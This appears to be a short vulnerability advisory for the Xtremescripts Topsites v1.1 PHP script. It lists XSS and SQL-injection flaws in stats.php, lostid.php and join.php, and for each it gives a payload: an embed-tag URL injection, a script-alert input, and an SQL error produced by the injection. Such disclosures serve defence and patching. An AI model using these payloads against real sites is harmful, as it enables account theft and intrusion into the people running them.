Xtremescripts Topsites v1.1

Homepage:
http://www.xtremescripts.com/topsites.php

Description:

Xtreme Topsites is a popular topsite PHP script for websites. Most commonly 
  used across anime websites at the moment. The topsite will count hits/clicks 
  in and hits out and will rank them on total hits so that the site with the most 
  hits will be number 1. 

Effected files:
stats.php
join.php
lostid.php

Exploit:
stats.php allows embedded objects which in turn can cause a XSS.

example:

http://www.example.com/xtremets/stats.php?id=1 <embed allowScriptAccess="never"src="harmfulflash.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="

0" height="0"></embed>


lostid.php input data isn't properally sanatized & filtered which allows for XSS

example:

put in box: <script>alert('hi')</script>

Input data on join.php isn't sanatized and can create mysql errors if users input malicious data.

example:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right 

syntax to use near 'hi'','9cdfb439c7876e703e307864c9167a15','0','19052006','-')' at line 2
